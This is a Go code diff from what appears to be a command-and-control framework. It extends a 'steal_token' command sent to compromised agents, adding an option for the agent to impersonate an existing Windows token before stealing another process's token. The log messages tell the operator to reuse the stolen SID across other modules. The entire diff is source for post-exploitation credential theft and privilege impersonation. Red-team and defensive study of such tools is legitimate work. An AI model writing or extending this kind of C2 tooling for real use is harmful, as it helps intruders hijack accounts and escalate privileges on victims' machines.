@@ -178,6 +178,9 @@ func hasModuleRunner(name string) bool {
 // It reads the "pid" flag from ctx.Flags, sends the !steal_token --pid <pid>
 // command to the target agent, and logs a reminder about using the resulting
 // SID in the "token" option of other modules.
+//
+// If the "token" flag is set, it is forwarded as --token <sid> so the agent
+// can impersonate the existing token before opening the target process.
 func runStealToken(ctx *c2context.C2Context) {
 	if ctx.Target == nil {
 		logging.Errorf("steal_token: no active agent")
@@ -190,13 +193,22 @@ func runStealToken(ctx *c2context.C2Context) {
 		return
 	}
 
+	tokenSID := strings.TrimSpace(ctx.Flags["token"])
+
 	cmd := fmt.Sprintf("%s --pid %s", def.C2CmdStealToken, strconv.Quote(strings.TrimSpace(pid)))
+	if tokenSID != "" {
+		cmd += fmt.Sprintf(" --token %s", strconv.Quote(tokenSID))
+	}
 	if err := CmdSender(cmd, "", ctx.Target.Tag); err != nil {
 		logging.Errorf("steal_token: sending command: %v", err)
 		return
 	}
 
-	logging.Infof("steal_token: sent to %s (pid=%s) – on success the agent will report the SID; use that SID as the 'token' option in other modules", ctx.Target.Tag, pid)
+	if tokenSID != "" {
+		logging.Infof("steal_token: sent to %s (pid=%s, token=%s) – on success the agent will report the SID; use that SID as the 'token' option in other modules", ctx.Target.Tag, pid, tokenSID)
+	} else {
+		logging.Infof("steal_token: sent to %s (pid=%s) – on success the agent will report the SID; use that SID as the 'token' option in other modules", ctx.Target.Tag, pid)
+	}
 }
 
 // runListTokens sends !list_tokens to the target agent to dump all cached
